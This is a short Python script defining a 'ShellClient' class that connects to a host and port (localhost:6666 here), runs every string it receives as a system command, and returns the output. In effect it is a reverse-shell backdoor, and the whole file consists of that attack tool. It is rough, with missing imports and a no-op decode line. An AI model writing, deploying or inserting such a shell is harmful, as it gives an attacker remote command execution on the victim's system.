class ShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connecting(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        while True:
            receive = s.recv(1024)
            receive.decode("utf-8")
            if receive:
                command = subprocess.Popen(receive[:].decode("utf-8"), stdout=subprocess.PIPE,
                        stderr= subprocess.PIPE, stdin= subprocess.PIPE)
                output=command.stdout.read() + command.stderr.read()
                s.send(output)


if __name__ == '__main__':
    host = '127.0.0.1'
    port = 6666
    x = ShellClient(host, port)
    x.connecting()
